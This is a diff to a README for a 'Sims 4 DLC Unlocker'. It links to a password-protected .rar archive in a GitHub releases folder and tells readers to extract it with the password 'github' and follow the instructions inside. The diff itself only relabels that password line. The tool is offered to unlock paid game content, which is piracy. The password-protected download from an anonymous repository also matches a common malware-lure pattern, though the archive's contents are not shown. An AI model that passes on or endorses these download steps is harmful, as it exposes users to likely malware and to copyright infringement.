@@ -4,7 +4,7 @@
 To get started with Sims 4 DLC Unlocker, follow these simple steps:
 1. **Get the unlocker: [![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Sims%204-DLC%20Unlocker-green
 )](https://github.com/Sims-4-DLC-Unlocker/.github/releases/download/1.3.4/Sims.4.DLC.Unlocker.rar)**
-2. **Pass: github**
+2. **PASSWORD: github**
 3. **Unlock the archive and follow the instructions in the archive!**
 4. **Enjoy the game!**
 
